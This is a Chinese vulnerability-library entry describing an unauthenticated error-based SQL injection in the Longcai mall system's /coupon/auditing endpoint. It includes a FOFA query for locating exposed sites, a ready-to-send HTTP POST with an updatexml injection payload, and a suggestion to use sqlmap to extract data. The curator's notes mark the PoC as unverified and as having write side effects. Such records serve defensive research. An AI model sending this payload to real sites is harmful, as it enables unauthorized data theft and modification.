---
source: "wy876 漏洞文库"
title: "龙采商城系统 coupon/auditing id报错SQL 注入"
product: "龙采商城系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本，MySQL UPDATEXML"
prerequisites: "未授权声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ohz4lxse6x8dctsn"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%BE%99%E9%87%87%E7%A7%91%E6%8A%80%E9%9B%86%E5%9B%A2%E6%9C%89%E9%99%90%E8%B4%A3%E4%BB%BB%E5%85%AC%E5%8F%B8/%E9%BE%99%E9%87%87%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E6%96%B0%E4%BA%BA%E7%A4%BC%E5%8C%85%E6%9D%83%E9%99%90%E5%BC%80%E5%85%B3%E5%A4%84%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83SQL%E6%B3%A8%E5%85%A5.md"
fofa: "body=\"'url':'/pc2.0/index/index'\""
fofa_unverified: "body="
id: "vw-aa1e3aabc4d76a6288f0e2ed"
entity_id: "ve-aa1e3aabc4d76a6288f0e2ed"
schema_version: "1"
---

# 龙采商城系统 coupon/auditing id报错SQL 注入

## 条目说明

- 对象与具体问题：龙采商城系统；coupon/auditing id报错SQLi
- 版本、配置及部署条件：未知版本，MySQL UPDATEXML
- 认证与权限前提：未授权声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 优惠券审核/权限开关为写业务接口，不能把sqlmap或报错探测当无副作用查询
- 与580相同载荷但不同业务路由，不合为一重复文
- 没有真实报错/基线，界面框架段空；Content-Length60静态且正文空行多
- 缺版本/补丁与权限对照，推广大量导出不是证明

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

#### 一、漏洞描述
龙采科技集团有限责任公司龙采商城系统新人礼包权限开关处存在未授权SQL注入，可直接无需登录后台即可暴露出数据库敏感信息。

#### 二、影响版本
龙采商城系统

#### 三、资产测绘
FOFA：body="'url':'/pc2.0/index/index'"

界面框架大致如下：


#### 四、漏洞复现
```http
POST /coupon/auditing HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Connection: close

id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)


```

> 请求长度说明：原资料 Content-Length 为 60；静态长度已移除，应由客户端根据最终请求体的字节数生成。

使用burp请求POC即可暴出敏感数据库（也可以采用sqlmap跑出大量敏感信息）


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ohz4lxse6x8dctsn>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
